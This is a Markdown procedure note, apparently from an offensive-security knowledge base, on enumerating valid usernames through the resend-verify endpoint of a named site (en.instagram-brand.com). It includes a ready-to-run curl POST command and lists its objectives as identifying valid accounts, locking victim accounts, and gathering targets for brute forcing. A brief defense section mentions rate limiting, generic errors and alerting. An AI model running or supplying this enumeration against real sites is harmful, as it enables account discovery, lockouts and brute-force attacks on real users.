---
id: uuid-3
tags:
  - enumeration
  - manual
type: procedure
tools:
  - '[[tools/Intercepting-Proxy]]'
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/resend-verify-post-request]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Account Discovery]]'
updated_at: '2025-12-14T17:33:12.523Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Account Discovery]]'
---
# Manual-Username-Enumeration-via-Resend-Verify

## Summary

This procedure manually tests email addresses against the resend-verify endpoint to enumerate valid usernames, leveraging verbose responses and email triggers as indicators.

## Description

The endpoint at POST /wp-json/brc/v1/resend-verify lacks rate limiting and provides distinct feedback: success messages and actual emails for valid users, errors for invalid. This allows targeted discovery and incidental DoS via lockouts.

## Requirements

1. Captured request template from interception
2. List of target emails
3. curl or proxy tool for sending requests

## Defense

Defensive measures and detection strategies:

- Implement rate limiting (e.g., 5 req/min per IP)
- Suppress verbose errors; use generic responses
- Alert on repeated resend attempts

## Objectives

1. Identify valid email/username pairs
2. Trigger verification to lock victim accounts
3. Gather targets for brute-force phase

## Instructions

### Step 1: Prepare Payload

**Context**: Set up the request with target email.

Use the intercepted headers and modify email.

### Step 2: Send Enumeration Request

**Context**: Execute the test for each email.

**Command** ([[commands/resend-verify-post-request]]):

```bash
curl -X POST https://en.instagram-brand.com/wp-json/brc/v1/resend-verify \
  -H "User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0" \
  -H "Accept: */*" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Referer: https://en.instagram-brand.com/register/signup" \
  -d "email=target@example.com"
```

> Valid: {"success":true, "message":"Email sent"}; Invalid: Error response. Valid also sends email, locking account.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]] Discovery

### Techniques

- [[Account Discovery]] Account Discovery

### Sub-Techniques


## Commands Used

- [[commands/resend-verify-post-request]]

## Tools Used

- [[tools/Intercepting-Proxy]]

## Tags

- enumeration
- manual
